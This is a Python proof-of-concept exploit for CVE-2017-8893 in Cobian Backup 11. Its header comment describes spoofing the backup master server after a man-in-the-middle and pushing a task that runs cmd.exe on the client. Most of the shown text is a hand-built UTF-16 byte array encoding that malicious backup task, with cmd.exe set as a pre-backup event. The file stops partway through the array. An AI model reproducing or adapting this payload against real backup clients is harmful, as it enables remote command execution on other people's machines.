# Proof of concept - CVE-2017-8893 (Cobian Backup 11)
# Discovered by: Juan Manuel Fernandez (@TheXC3LL)
# Description: Remote Command Execution (PoC, it's only pops a cmd window in the client). This PoC spoofs the master server
# (you need to do a MitM before), send a new backup task and execute it. We set the command "cmd.exe" as pre-backup event.


import socket
import signal
import sys
from thread import *

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)


###### Socket data
host = ''
port = 16020 #Default

###### Server Packets
iddle = "490044004c0045002c002c000d000a00"

get_options = "4700450054005f004f005000540049004f004e0053002c002c000d000a00"

password_ok = "500041005300530057004f00520044005f004f004b002c002c000d000a00"

task_template = [
0x55, 0x00, 0x50, 0x00, 0x44, 0x00, 0x41, 0x00, 
0x54, 0x00, 0x45, 0x00, 0x5f, 0x00, 0x4c, 0x00, 
0x49, 0x00, 0x53, 0x00, 0x54, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x7b, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x2f, 0x00, 0x2f, 0x00, 0x2c, 0x00, 0x49, 0x00, 
0x64, 0x00, 0x3d, 0x00, 0x7b, 0x00, 0x45, 0x00, 
0x37, 0x00, 0x45, 0x00, 0x43, 0x00, 0x46, 0x00, 
0x34, 0x00, 0x32, 0x00, 0x44, 0x00, 0x2d, 0x00, 
0x37, 0x00, 0x38, 0x00, 0x45, 0x00, 0x34, 0x00, 
0x2d, 0x00, 0x34, 0x00, 0x32, 0x00, 0x34, 0x00, 
0x38, 0x00, 0x2d, 0x00, 0x42, 0x00, 0x37, 0x00, 
0x45, 0x00, 0x45, 0x00, 0x2d, 0x00, 0x33, 0x00, 
0x38, 0x00, 0x39, 0x00, 0x35, 0x00, 0x33, 0x00, 
0x36, 0x00, 0x44, 0x00, 0x38, 0x00, 0x42, 0x00, 
0x44, 0x00, 0x33, 0x00, 0x38, 0x00, 0x7d, 0x00, 
0x2c, 0x00, 0x4e, 0x00, 0x61, 0x00, 0x6d, 0x00, 
0x65, 0x00, 0x3d, 0x00, 0x7b, 0x00, 0x45, 0x00, 
0x37, 0x00, 0x45, 0x00, 0x43, 0x00, 0x46, 0x00, 
0x34, 0x00, 0x32, 0x00, 0x44, 0x00, 0x2d, 0x00, 
0x37, 0x00, 0x38, 0x00, 0x45, 0x00, 0x34, 0x00, 
0x2d, 0x00, 0x34, 0x00, 0x32, 0x00, 0x34, 0x00, 
0x38, 0x00, 0x2d, 0x00, 0x42, 0x00, 0x37, 0x00, 
0x45, 0x00, 0x45, 0x00, 0x2d, 0x00, 0x33, 0x00, 
0x38, 0x00, 0x39, 0x00, 0x35, 0x00, 0x33, 0x00, 
0x36, 0x00, 0x44, 0x00, 0x38, 0x00, 0x42, 0x00, 
0x44, 0x00, 0x33, 0x00, 0x38, 0x00, 0x7d, 0x00, 
0x2c, 0x00, 0x47, 0x00, 0x72, 0x00, 0x6f, 0x00, 
0x75, 0x00, 0x70, 0x00, 0x3d, 0x00, 0x2c, 0x00, 
0x45, 0x00, 0x6e, 0x00, 0x61, 0x00, 0x62, 0x00, 
0x6c, 0x00, 0x65, 0x00, 0x64, 0x00, 0x3d, 0x00, 
0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x49, 0x00, 
0x6e, 0x00, 0x63, 0x00, 0x6c, 0x00, 0x75, 0x00, 
0x64, 0x00, 0x65, 0x00, 0x20, 0x00, 0x73, 0x00, 
0x75, 0x00, 0x62, 0x00, 0x64, 0x00, 0x69, 0x00, 
0x72, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00, 
0x6f, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 
0x73, 0x00, 0x3d, 0x00, 0x74, 0x00, 0x72, 0x00, 
0x75, 0x00, 0x65, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x43, 0x00, 
0x72, 0x00, 0x65, 0x00, 0x61, 0x00, 0x74, 0x00, 
0x65, 0x00, 0x20, 0x00, 0x73, 0x00, 0x65, 0x00, 
0x70, 0x00, 0x61, 0x00, 0x72, 0x00, 0x61, 0x00, 
0x74, 0x00, 0x65, 0x00, 0x64, 0x00, 0x20, 0x00, 
0x62, 0x00, 0x61, 0x00, 0x63, 0x00, 0x6b, 0x00, 
0x75, 0x00, 0x70, 0x00, 0x73, 0x00, 0x3d, 0x00, 
0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 
0x20, 0x00, 0x61, 0x00, 0x74, 0x00, 0x74, 0x00, 
0x72, 0x00, 0x69, 0x00, 0x62, 0x00, 0x75, 0x00, 
0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x3d, 0x00, 
0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 
0x20, 0x00, 0x56, 0x00, 0x53, 0x00, 0x43, 0x00, 
0x3d, 0x00, 0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 
0x65, 0x00, 0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x42, 0x00, 0x61, 0x00, 
0x63, 0x00, 0x6b, 0x00, 0x75, 0x00, 0x70, 0x00, 
0x20, 0x00, 0x74, 0x00, 0x79, 0x00, 0x70, 0x00, 
0x65, 0x00, 0x3d, 0x00, 0x30, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x50, 0x00, 0x72, 0x00, 
0x69, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x69, 0x00, 
0x74, 0x00, 0x79, 0x00, 0x3d, 0x00, 0x30, 0x00, 
0x2c, 0x00, 0x53, 0x00, 0x6f, 0x00, 0x75, 0x00, 
0x72, 0x00, 0x63, 0x00, 0x65, 0x00, 0x3d, 0x00, 
0x2c, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 
0x74, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x61, 0x00, 
0x74, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 
0x3d, 0x00, 0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x53, 0x00, 0x63, 0x00, 0x68, 0x00, 0x65, 0x00, 
0x64, 0x00, 0x75, 0x00, 0x6c, 0x00, 0x65, 0x00, 
0x20, 0x00, 0x74, 0x00, 0x79, 0x00, 0x70, 0x00, 
0x65, 0x00, 0x3d, 0x00, 0x31, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x53, 0x00, 0x65, 0x00, 0x6c, 0x00, 0x65, 0x00, 
0x63, 0x00, 0x74, 0x00, 0x20, 0x00, 0x64, 0x00, 
0x61, 0x00, 0x79, 0x00, 0x73, 0x00, 0x20, 0x00, 
0x6f, 0x00, 0x66, 0x00, 0x20, 0x00, 0x74, 0x00, 
0x68, 0x00, 0x65, 0x00, 0x20, 0x00, 0x77, 0x00, 
0x65, 0x00, 0x65, 0x00, 0x6b, 0x00, 0x3d, 0x00, 
0x66, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x73, 0x00, 
0x65, 0x00, 0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x4f, 0x00, 0x72, 0x00, 
0x64, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 
0x6f, 0x00, 0x66, 0x00, 0x20, 0x00, 0x44, 0x00, 
0x61, 0x00, 0x79, 0x00, 0x20, 0x00, 0x6f, 0x00, 
0x66, 0x00, 0x20, 0x00, 0x74, 0x00, 0x68, 0x00, 
0x65, 0x00, 0x20, 0x00, 0x77, 0x00, 0x65, 0x00, 
0x65, 0x00, 0x6b, 0x00, 0x3d, 0x00, 0x31, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x44, 0x00, 0x61, 0x00, 0x79, 0x00, 
0x20, 0x00, 0x6f, 0x00, 0x66, 0x00, 0x20, 0x00, 
0x74, 0x00, 0x68, 0x00, 0x65, 0x00, 0x20, 0x00, 
0x77, 0x00, 0x65, 0x00, 0x65, 0x00, 0x6b, 0x00, 
0x3d, 0x00, 0x31, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x44, 0x00, 0x61, 0x00, 0x74, 0x00, 
0x65, 0x00, 0x2f, 0x00, 0x54, 0x00, 0x69, 0x00, 
0x6d, 0x00, 0x65, 0x00, 0x3d, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x44, 0x00, 0x61, 0x00, 
0x79, 0x00, 0x20, 0x00, 0x6f, 0x00, 0x66, 0x00, 
0x20, 0x00, 0x74, 0x00, 0x68, 0x00, 0x65, 0x00, 
0x20, 0x00, 0x6d, 0x00, 0x6f, 0x00, 0x6e, 0x00, 
0x74, 0x00, 0x68, 0x00, 0x3d, 0x00, 0x31, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x4d, 0x00, 
0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x68, 0x00, 
0x3d, 0x00, 0x31, 0x00, 0x2c, 0x00, 0x54, 0x00, 
0x69, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x72, 0x00, 
0x3d, 0x00, 0x31, 0x00, 0x38, 0x00, 0x30, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x54, 0x00, 
0x69, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x72, 0x00,
0x20, 0x00, 0x66, 0x00, 0x72, 0x00, 0x6f, 0x00, 
0x6d, 0x00, 0x3d, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x54, 0x00, 
0x69, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x72, 0x00, 
0x20, 0x00, 0x74, 0x00, 0x6f, 0x00, 0x3d, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x31, 0x00, 0x30, 0x00, 0x31, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x30, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x46, 0x00, 0x75, 0x00, 0x6c, 0x00, 
0x6c, 0x00, 0x20, 0x00, 0x63, 0x00, 0x6f, 0x00, 
0x70, 0x00, 0x69, 0x00, 0x65, 0x00, 0x73, 0x00, 
0x3d, 0x00, 0x30, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x44, 0x00, 
0x69, 0x00, 0x66, 0x00, 0x66, 0x00, 0x65, 0x00, 
0x72, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 
0x61, 0x00, 0x6c, 0x00, 0x20, 0x00, 0x63, 0x00, 
0x6f, 0x00, 0x70, 0x00, 0x69, 0x00, 0x65, 0x00, 
0x73, 0x00, 0x3d, 0x00, 0x30, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x4f, 0x00, 0x6e, 0x00, 0x65, 0x00, 0x20, 0x00, 
0x66, 0x00, 0x75, 0x00, 0x6c, 0x00, 0x6c, 0x00, 
0x20, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 
0x72, 0x00, 0x79, 0x00, 0x3d, 0x00, 0x30, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x55, 0x00,
0x73, 0x00, 0x65, 0x00, 0x20, 0x00, 0x66, 0x00, 
0x69, 0x00, 0x78, 0x00, 0x65, 0x00, 0x64, 0x00, 
0x20, 0x00, 0x64, 0x00, 0x61, 0x00, 0x79, 0x00, 
0x3d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x6c, 0x00, 
0x73, 0x00, 0x65, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x46, 0x00, 
0x69, 0x00, 0x78, 0x00, 0x65, 0x00, 0x64, 0x00, 
0x20, 0x00, 0x64, 0x00, 0x61, 0x00, 0x79, 0x00, 
0x3d, 0x00, 0x31, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x43, 0x00, 0x6f, 0x00, 0x6d, 0x00, 
0x70, 0x00, 0x72, 0x00, 0x65, 0x00, 0x73, 0x00, 
0x73, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 
0x3d, 0x00, 0x30, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x43, 0x00, 0x6f, 0x00, 0x6d, 0x00, 
0x70, 0x00, 0x72, 0x00, 0x65, 0x00, 0x73, 0x00, 
0x73, 0x00, 0x20, 0x00, 0x69, 0x00, 0x6e, 0x00, 
0x64, 0x00, 0x69, 0x00, 0x76, 0x00, 0x69, 0x00, 
0x64, 0x00, 0x75, 0x00, 0x61, 0x00, 0x6c, 0x00, 
0x6c, 0x00, 0x79, 0x00, 0x3d, 0x00, 0x66, 0x00, 
0x61, 0x00, 0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x53, 0x00, 
0x70, 0x00, 0x6c, 0x00, 0x69, 0x00, 0x74, 0x00, 
0x3d, 0x00, 0x30, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x43, 0x00, 0x75, 0x00, 0x73, 0x00, 
0x74, 0x00, 0x6f, 0x00, 0x6d, 0x00, 0x20, 0x00, 
0x73, 0x00, 0x69, 0x00, 0x7a, 0x00, 0x65, 0x00, 
0x3d, 0x00, 0x34, 0x00, 0x33, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 
0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x43, 0x00, 0x6f, 0x00, 0x6d, 0x00, 0x6d, 0x00, 
0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x3d, 0x00, 
0x43, 0x00, 0x6f, 0x00, 0x62, 0x00, 0x69, 0x00, 
0x61, 0x00, 0x6e, 0x00, 0x20, 0x00, 0x42, 0x00, 
0x61, 0x00, 0x63, 0x00, 0x6b, 0x00, 0x75, 0x00, 
0x70, 0x00, 0x20, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x20, 0x00, 0x47, 0x00, 0x72, 0x00, 0x61, 0x00, 
0x76, 0x00, 0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x45, 0x00, 
0x6e, 0x00, 0x63, 0x00, 0x72, 0x00, 0x79, 0x00, 
0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6f, 0x00, 
0x6e, 0x00, 0x3d, 0x00, 0x30, 0x00, 0x2c, 0x00, 
0x50, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 
0x70, 0x00, 0x68, 0x00, 0x72, 0x00, 0x61, 0x00, 
0x73, 0x00, 0x65, 0x00, 0x3d, 0x00, 0x59, 0x00, 
0x67, 0x00, 0x42, 0x00, 0x6c, 0x00, 0x41, 0x00, 
0x47, 0x00, 0x41, 0x00, 0x41, 0x00, 0x63, 0x00, 
0x51, 0x00, 0x42, 0x00, 0x33, 0x00, 0x41, 0x00, 
0x47, 0x00, 0x73, 0x00, 0x41, 0x00, 0x61, 0x00, 
0x77, 0x00, 0x42, 0x00, 0x37, 0x00, 0x41, 0x00, 
0x48, 0x00, 0x6b, 0x00, 0x41, 0x00, 0x61, 0x00, 
0x51, 0x00, 0x41, 0x00, 0x35, 0x00, 0x41, 0x00, 
0x48, 0x00, 0x77, 0x00, 0x41, 0x00, 0x42, 0x00, 
0x77, 0x00, 0x41, 0x00, 0x44, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x30, 0x00, 0x41, 0x00, 0x63, 0x00, 
0x77, 0x00, 0x42, 0x00, 0x78, 0x00, 0x41, 0x00, 
0x48, 0x00, 0x55, 0x00, 0x41, 0x00, 0x65, 0x00, 
0x77, 0x00, 0x41, 0x00, 0x64, 0x00, 0x41, 0x00, 
0x42, 0x00, 0x41, 0x00, 0x41, 0x00, 0x63, 0x00, 
0x67, 0x00, 0x42, 0x00, 0x2b, 0x00, 0x41, 0x00, 
0x48, 0x00, 0x49, 0x00, 0x41, 0x00, 0x65, 0x00, 
0x51, 0x00, 0x41, 0x00, 0x45, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x67, 0x00, 0x41, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x42, 0x00, 0x34, 0x00, 0x41, 0x00, 
0x42, 0x00, 0x30, 0x00, 0x41, 0x00, 0x61, 0x00, 
0x51, 0x00, 0x41, 0x00, 0x4a, 0x00, 0x41, 0x00, 
0x48, 0x00, 0x4d, 0x00, 0x41, 0x00, 0x64, 0x00, 
0x77, 0x00, 0x42, 0x00, 0x6f, 0x00, 0x41, 0x00, 
0x43, 0x00, 0x77, 0x00, 0x41, 0x00, 0x43, 0x00, 
0x51, 0x00, 0x41, 0x00, 0x42, 0x00, 0x41, 0x00, 
0x48, 0x00, 0x55, 0x00, 0x41, 0x00, 0x44, 0x00, 
0x77, 0x00, 0x42, 0x00, 0x2b, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x6b, 0x00, 0x41, 0x00, 0x63, 0x00, 
0x41, 0x00, 0x42, 0x00, 0x37, 0x00, 0x41, 0x00, 
0x47, 0x00, 0x4d, 0x00, 0x41, 0x00, 0x63, 0x00, 
0x77, 0x00, 0x41, 0x00, 0x44, 0x00, 0x41, 0x00, 
0x44, 0x00, 0x38, 0x00, 0x41, 0x00, 0x66, 0x00, 
0x41, 0x00, 0x41, 0x00, 0x6d, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x3d, 0x00, 0x3d, 0x00, 0x2c, 0x00, 
0x45, 0x00, 0x78, 0x00, 0x63, 0x00, 0x6c, 0x00, 
0x75, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6f, 0x00, 
0x6e, 0x00, 0x73, 0x00, 0x3d, 0x00, 0x2c, 0x00, 
0x49, 0x00, 0x6e, 0x00, 0x63, 0x00, 0x6c, 0x00, 
0x75, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6f, 0x00, 
0x6e, 0x00, 0x73, 0x00, 0x3d, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x50, 0x00, 0x72, 0x00, 
0x65, 0x00, 0x20, 0x00, 0x62, 0x00, 0x61, 0x00, 
0x63, 0x00, 0x6b, 0x00, 0x75, 0x00, 0x70, 0x00, 
0x20, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 
0x6e, 0x00, 0x74, 0x00, 0x73, 0x00, 0x3d, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x45, 0x00, 0x58, 0x00, 0x45, 0x00, 0x43, 0x00, 
0x55, 0x00, 0x54, 0x00, 0x45, 0x00, 0x2c, 0x00, 
0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 
0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 
0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x53, 0x00, 
0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 
0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 
0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 
0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x50, 0x00, 0x6f, 0x00, 0x73, 0x00, 
0x74, 0x00, 0x20, 0x00, 0x62, 0x00, 0x61, 0x00, 
0x63, 0x00, 0x6b, 0x00, 0x75, 0x00, 0x70, 0x00, 
0x20, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 
0x6e, 0x00, 0x74, 0x00, 0x73, 0x00, 0x3d, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 
0x72, 0x00, 0x74, 0x00, 0x20, 0x00, 0x69, 0x00, 
0x66, 0x00, 0x20, 0x00, 0x70, 0x00, 0x72, 0x00, 
0x65, 0x00, 0x2d, 0x00, 0x65, 0x00, 0x76, 0x00, 
0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x20, 0x00, 
0x66, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6c, 0x00, 
0x73, 0x00, 0x3d, 0x00, 0x66, 0x00, 0x61, 0x00, 
0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x72, 0x00, 
0x74, 0x00, 0x20, 0x00, 0x69, 0x00, 0x66, 0x00, 
0x20, 0x00, 0x70, 0x00, 0x6f, 0x00, 0x73, 0x00, 
0x74, 0x00, 0x2d, 0x00, 0x65, 0x00, 0x76, 0x00, 
0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x20, 0x00, 
0x66, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6c, 0x00, 
0x73, 0x00, 0x3d, 0x00, 0x66, 0x00, 0x61, 0x00, 
0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x4d, 0x00, 0x69, 0x00, 
0x72, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x72, 0x00, 
0x3d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x6c, 0x00,
0x73, 0x00, 0x65, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x41, 0x00, 0x62, 0x00, 0x73, 0x00, 
0x6f, 0x00, 0x6c, 0x00, 0x75, 0x00, 0x74, 0x00, 
0x65, 0x00, 0x20, 0x00, 0x70, 0x00, 0x61, 0x00, 
0x74, 0x00, 0x68, 0x00, 0x73, 0x00, 0x3d, 0x00, 
0x66, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x73, 0x00, 
0x65, 0x00, 0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x41, 0x00, 0x6c, 0x00, 
0x77, 0x00, 0x61, 0x00, 0x79, 0x00, 0x73, 0x00, 
0x20, 0x00, 0x63, 0x00, 0x72, 0x00, 0x65, 0x00, 
0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x20, 0x00, 
0x74, 0x00, 0x6f, 0x00, 0x70, 0x00, 0x20, 0x00, 
0x64, 0x00, 0x69, 0x00, 0x72, 0x00, 0x65, 0x00, 
0x63, 0x00, 0x74, 0x00, 0x6f, 0x00, 0x72, 0x00, 
0x79, 0x00, 0x3d, 0x00, 0x74, 0x00, 0x72, 0x00, 
0x75, 0x00, 0x65, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x43, 0x00, 
0x6c, 0x00, 0x65, 0x00, 0x61, 0x00, 0x72, 0x00, 
0x20, 0x00, 0x61, 0x00, 0x72, 0x00, 0x63, 0x00, 
0x68, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 
0x20, 0x00, 0x61, 0x00, 0x74, 0x00, 0x74, 0x00, 
0x72, 0x00, 0x69, 0x00, 0x62, 0x00, 0x75, 0x00, 
0x74, 0x00, 0x65, 0x00, 0x3d, 0x00, 0x74, 0x00, 
0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 
0x49, 0x00, 0x6e, 0x00, 0x63, 0x00, 0x6c, 0x00, 
0x75, 0x00, 0x64, 0x00, 0x65, 0x00, 0x20, 0x00, 
0x62, 0x00, 0x61, 0x00, 0x63, 0x00, 0x6b, 0x00, 
0x75, 0x00, 0x70, 0x00, 0x20, 0x00, 0x74, 0x00, 
0x79, 0x00, 0x70, 0x00, 0x65, 0x00, 0x3d, 0x00, 
0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x44, 0x00, 0x65, 0x00, 0x6c, 0x00, 
0x65, 0x00, 0x74, 0x00, 0x65, 0x00, 0x20, 0x00, 
0x65, 0x00, 0x6d, 0x00, 0x70, 0x00, 0x74, 0x00, 
0x79, 0x00, 0x20, 0x00, 0x64, 0x00, 0x69, 0x00, 
0x72, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00, 
0x6f, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 
0x73, 0x00, 0x3d, 0x00, 0x66, 0x00, 0x61, 0x00, 
0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 0x22, 0x00, 
